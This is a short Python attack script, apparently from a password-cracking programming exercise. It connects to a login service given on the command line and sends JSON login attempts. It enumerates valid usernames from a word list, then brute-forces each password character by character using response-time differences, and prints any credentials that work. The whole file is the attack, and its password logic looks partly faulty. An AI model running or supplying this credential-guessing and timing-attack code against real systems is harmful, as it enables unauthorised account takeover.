import sys
import socket
import itertools
import json
import string
import time

args = sys.argv
address = (args[1], int(args[2]))
sock = socket.socket()
sock.connect(address)
user, password, count = '', '', 0
chars = tuple(itertools.chain(string.ascii_letters, string.digits))

with open('logins.txt', 'r') as file:
    logins = file.read().split()

for login in logins:
    try:
        usr_nm = {"login": login, "password": " "}
        sock.send(json.dumps(usr_nm).encode('utf8'))
        response = sock.recv(256).decode()
        if response == '{"result": "Wrong password!"}':
            user = login
            for _ in range(10):  # attempts
                for letter in chars:
                    password += letter
                    usr_nm = {"login": user, "password": password}
                    sock.send(json.dumps(usr_nm).encode('utf8'))
                    start = time.perf_counter()
                    response = sock.recv(256).decode()
                    end = time.perf_counter()
                    if response == '{"result": "Wrong password!"}':
                        if (end - start) < 0.1:
                            password = password.rstrip(password[-1])
                    if response == '{"result": "Connection success!"}':
                        print(json.dumps(usr_nm))
    except:
        pass
sock.close()
